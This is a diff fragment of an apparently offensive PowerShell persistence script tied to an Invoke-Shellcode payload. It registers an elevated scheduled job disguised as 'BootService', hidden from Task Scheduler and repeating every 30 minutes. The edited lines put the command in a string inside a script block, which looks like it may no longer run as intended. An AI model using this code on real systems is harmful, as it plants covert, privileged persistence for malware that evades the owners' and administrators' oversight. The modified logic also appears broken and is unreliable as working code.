@@ -97,7 +97,8 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        "the `$Script path is {$Filepath}"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        $Trig = New-JobTrigger -Once -At "7:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
-       $Fincommand = {Register-ScheduledJob -Name BootService -ScriptBlock {$Filepath} -Trigger $Trig -ScheduledJobOption $Option -RunNow}
+       $script = "Register-ScheduledJob -Name BootService -ScriptBlock {$Filepath} -Trigger $Trig -ScheduledJobOption $Option -RunNow"
+       $Fincommand = {$script}
        "Whole path is $Fincommand"
        Invoke-Command -ScriptBlock $Fincommand
        "Process Complete."
